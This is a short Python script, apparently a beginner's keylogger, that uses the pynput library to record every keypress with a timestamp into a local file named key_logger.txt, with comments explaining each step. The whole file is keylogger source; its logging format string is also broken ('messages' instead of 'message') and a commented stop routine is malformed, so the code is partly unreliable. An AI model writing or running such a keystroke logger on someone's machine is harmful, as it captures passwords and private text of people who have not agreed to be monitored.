#from library we'll import pynput & Listener
import logging
from pynput.keyboard import Key, Listener

#import logging

#now we'll make a log file to save the logging details
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_logger.txt"),
level=logging.DEBUG, format='%(asctime)s: %(messages)s:')

#from the library 
def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #stop Listener
	#return.join()

#making the Listener on
with Listener(on_press=on_press) as listener:
    listener.join()
